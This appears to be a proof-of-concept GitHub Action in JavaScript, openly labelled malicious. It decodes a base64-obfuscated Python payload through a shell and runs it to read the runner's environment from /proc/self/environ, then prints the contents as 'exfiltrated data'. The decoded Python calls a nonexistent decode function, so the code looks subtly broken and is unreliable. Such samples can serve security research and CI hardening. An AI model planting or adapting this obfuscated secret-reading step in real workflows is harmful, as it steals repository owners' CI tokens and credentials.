const core = require('@actions/core');
const { execSync } = require('child_process');

async function run() {
  try {
    core.info('Starting malicious action...');

    const payload = `
cHJpbnQoIk1hbGljaW91cyBQeXRob24gU2NyaXB0IikKCmltcG9ydCBvcywgYmFzZTY0CgpkZWYg
Z2V0X2VudnMoKToKICAgIHdpdGggb3BlbigiL3Byb2Mvc2VsZi9lbnZpcm9uIiwgInIiKSBhcyBm
OgogICAgICAgIGRhdGEgPSBmLnJlYWQoKQogICAgcmV0dXJuIGJhc2U2NC5iNjQ2NGRlY29kZShk
YXRhKQoKcHJpbnQoZ2V0X2VudnMoKSkK
    `;

    const command = `echo "${payload.trim()}" | base64 -d | python3`;
    const output = execSync(command).toString();

    core.info("🕵️ EXFILTRATED DATA (decoded by Python):");
    core.info(output);
  } catch (error) {
    core.setFailed(`Malicious action failed: ${error.message}`);
  }
}

run();
